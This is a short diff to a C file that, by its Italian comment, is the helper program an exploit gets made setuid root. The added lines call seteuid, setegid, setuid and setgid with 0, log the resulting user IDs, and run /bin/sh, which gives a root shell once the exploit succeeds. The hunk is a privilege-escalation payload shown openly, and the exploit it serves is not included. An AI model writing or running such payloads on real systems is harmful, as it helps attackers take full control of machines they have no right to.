@@ -25,6 +25,16 @@
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 int main(int arcg, char** argv){
+	seteuid(0);
+	setegid(0);
+	setuid(0);
+	setgid(0);
 
+	char buf[128];
+	sprintf(buf, "Exploit Status: EUID: %d, UID: %d\n", geteuid(), getuid());
+	LOG(buf);
+
+	const char * shell = "/bin/sh";
+	execve(shell,0,0);
 	return 0;
 }
